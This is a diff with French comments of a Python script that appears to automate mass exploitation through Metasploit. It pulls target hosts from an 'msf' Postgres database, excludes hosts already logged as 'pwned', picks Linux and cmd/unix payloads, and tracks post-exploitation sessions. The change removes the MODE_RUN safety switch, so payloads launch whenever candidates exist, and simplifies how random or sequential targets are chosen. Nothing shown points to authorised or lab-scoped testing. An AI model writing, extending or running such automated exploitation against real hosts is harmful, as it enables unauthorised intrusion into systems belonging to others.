@@ -44,9 +44,9 @@ PG_USER = os.getenv("PG_USER", "postgres")
 PG_PASSWORD = _read_secret("postgres_password", "PG_PASSWORD")
 PG_DBNAME = os.getenv("PG_DBNAME", "msf")
 
-MODE_RUN  = int(os.getenv("MODE_RUN",  "1"))
-SCAN_MODE = os.getenv("SCAN_MODE", "normal")   # normal | debug
-READ_MODE = os.getenv("READ_MODE", "random")   # random | sequential
+MODE_DEBUG = os.getenv("MODE_DEBUG", "false").lower() in ("true", "1", "yes")
+# MODE_DEBUG=true  → lit dans host_debug, lecture séquentielle
+# MODE_DEBUG=false → lit dans hosts,      lecture aléatoire (TABLESAMPLE)
 
 _seq_cursor: int       = 0    # curseur offset pour lecture séquentielle
 _seq_total:  int|None  = None  # total hôtes dispo (recalculé après reset)
@@ -990,15 +990,12 @@ def mark_uzi_result(host_id: int, address: str, status: str,
 
 def pick_next_host():
     """
-    Sélectionne la prochaine cible selon SCAN_MODE et READ_MODE.
+    Sélectionne la prochaine cible selon MODE_DEBUG.
 
-    SCAN_MODE=normal  → exclut uniquement les 'pwned' (retente tried/error)
-    SCAN_MODE=debug   → exclut les hôtes déjà traités sans erreur (strict)
-
-    READ_MODE=random      → TABLESAMPLE SYSTEM(0.5) sur hosts (normal) ou
-                            ORDER BY RANDOM() sur host_debug (debug, table petite)
-    READ_MODE=sequential  → ORDER BY id OFFSET curseur global;
-                            retourne None + reset quand liste épuisée.
+    MODE_DEBUG=True  → lit dans host_debug, lecture séquentielle (ORDER BY id OFFSET curseur);
+                       retourne None + reset quand liste épuisée; scan_details joint depuis hosts.
+    MODE_DEBUG=False → lit dans hosts, lecture aléatoire (TABLESAMPLE SYSTEM(0.5));
+                       exclut les hôtes déjà 'pwned'.
 
     Retourne (host_id, address, scan_details) ou None.
     """
@@ -1009,28 +1006,22 @@ def pick_next_host():
                               host=PG_HOST, port=PG_PORT) as conn:
             with conn.cursor() as cur:
 
-                # ── Mode DEBUG : lecture depuis host_debug ─────────────────
-                if SCAN_MODE == "debug":
-                    table = "host_debug"
-                    count_q = f"SELECT COUNT(*) FROM {table}"
-                    if READ_MODE == "sequential":
-                        if _seq_total is None:
-                            cur.execute(count_q)
-                            _seq_total = cur.fetchone()[0]
-                            print(f"[SEQ/DEBUG] {_seq_total} hôtes dans host_debug")
-                        if _seq_total == 0 or _seq_cursor >= _seq_total:
-                            print(f"[SEQ/DEBUG] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
-                            _seq_cursor = 0
-                            _seq_total  = None
-                            return None
-                        cur.execute(
-                            f"SELECT id, address FROM {table} ORDER BY id LIMIT 1 OFFSET {_seq_cursor}"
-                        )
-                        _seq_cursor += 1
-                    else:
-                        # host_debug est une petite table → ORDER BY RANDOM() OK
-                        cur.execute(f"SELECT id, address FROM {table} ORDER BY RANDOM() LIMIT 1")
-
+                # ── Mode DEBUG : lecture séquentielle depuis host_debug ────
+                if MODE_DEBUG:
+                    if _seq_total is None:
+                        cur.execute("SELECT COUNT(*) FROM host_debug")
+                        _seq_total = cur.fetchone()[0]
+                        print(f"[SEQ/DEBUG] {_seq_total} hôtes dans host_debug")
+                    if _seq_total == 0 or _seq_cursor >= _seq_total:
+                        print(f"[SEQ/DEBUG] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
+                        _seq_cursor = 0
+                        _seq_total  = None
+                        return None
+                    cur.execute(
+                        "SELECT id, address FROM host_debug ORDER BY id LIMIT 1 OFFSET %s",
+                        (_seq_cursor,)
+                    )
+                    _seq_cursor += 1
                     row = cur.fetchone()
                     if not row:
                         return None
@@ -1041,10 +1032,9 @@ def pick_next_host():
                         (str(addr),)
                     )
                     sd_row = cur.fetchone()
-                    scan_details_raw = sd_row[0] if sd_row else None
-                    return (hid, addr, scan_details_raw)
+                    return (hid, addr, sd_row[0] if sd_row else None)
 
-                # ── Mode NORMAL : lecture depuis hosts ─────────────────────
+                # ── Mode NORMAL : lecture aléatoire depuis hosts ───────────
                 else:
                     base_where = (
                         "scan_status = 'bm12_v3' "
@@ -1054,26 +1044,10 @@ def pick_next_host():
                         "AND id NOT IN "
                         "  (SELECT host_id FROM uzi_scan_log WHERE status = 'pwned')"
                     )
-                    if READ_MODE == "sequential":
-                        if _seq_total is None:
-                            cur.execute(f"SELECT COUNT(*) FROM hosts WHERE {base_where}")
-                            _seq_total = cur.fetchone()[0]
-                            print(f"[SEQ/NORMAL] {_seq_total} hôtes disponibles")
-                        if _seq_total == 0 or _seq_cursor >= _seq_total:
-                            print(f"[SEQ/NORMAL] Fin de liste ({_seq_cursor}/{_seq_total}) → reset")
-                            _seq_cursor = 0
-                            _seq_total  = None
-                            return None
-                        cur.execute(
-                            f"SELECT id, address, scan_details FROM hosts "
-                            f"WHERE {base_where} ORDER BY id LIMIT 1 OFFSET {_seq_cursor}"
-                        )
-                        _seq_cursor += 1
-                    else:
-                        cur.execute(
-                            f"SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
-                            f"WHERE {base_where} LIMIT 1"
-                        )
+                    cur.execute(
+                        f"SELECT id, address, scan_details FROM hosts TABLESAMPLE SYSTEM(0.5) "
+                        f"WHERE {base_where} LIMIT 1"
+                    )
                     return cur.fetchone()
 
     except psycopg2.Error as e:
@@ -1534,8 +1508,8 @@ def main():
 
      row = pick_next_host()
      if row is None:
-        wait = 30 if READ_MODE == "sequential" else 60
-        print(f"[INFO] Aucun hôte disponible (SCAN_MODE={SCAN_MODE}, READ_MODE={READ_MODE}) — pause {wait}s.")
+        wait = 30 if MODE_DEBUG else 60
+        print(f"[INFO] Aucun hôte disponible (MODE_DEBUG={MODE_DEBUG}) — pause {wait}s.")
         time.sleep(wait)
         continue
      upgraded_sessions = set()
@@ -1545,9 +1519,9 @@ def main():
      host_id, host, scan_details_raw = row
      scan_details = json.loads(scan_details_raw) if isinstance(scan_details_raw, str) else (scan_details_raw or {})
      products = scan_details.get('products', [])
-     seq_info = f" [seq:{_seq_cursor}]" if READ_MODE == "sequential" else ""
+     seq_info = f" [seq:{_seq_cursor}]" if MODE_DEBUG else ""
      prod_names = [p.get('name', p) if isinstance(p, dict) else str(p) for p in products]
-     print(f"[INFO] Cible: {host}{seq_info} | mode={SCAN_MODE}/{READ_MODE} | produits: {prod_names}")
+     print(f"[INFO] Cible: {host}{seq_info} | MODE_DEBUG={MODE_DEBUG} | produits: {prod_names}")
      services = get_host_services_by_address(str(host))
      if not services:
          print(f"[INFO] Aucun service connu pour {host} — skip.")
@@ -1701,7 +1675,7 @@ def main():
 
              payload = [p for p in payload if p.startswith('linux/') or p.startswith('cmd/unix/')]
              payload = sorted(payload, key=_rank)[:5]
-             if len(payload) > 0 and MODE_RUN == 1:
+             if len(payload) > 0:
                  for p in payload:
                      if phase_session_id is not None:
                          stats['post_tried'] += 1
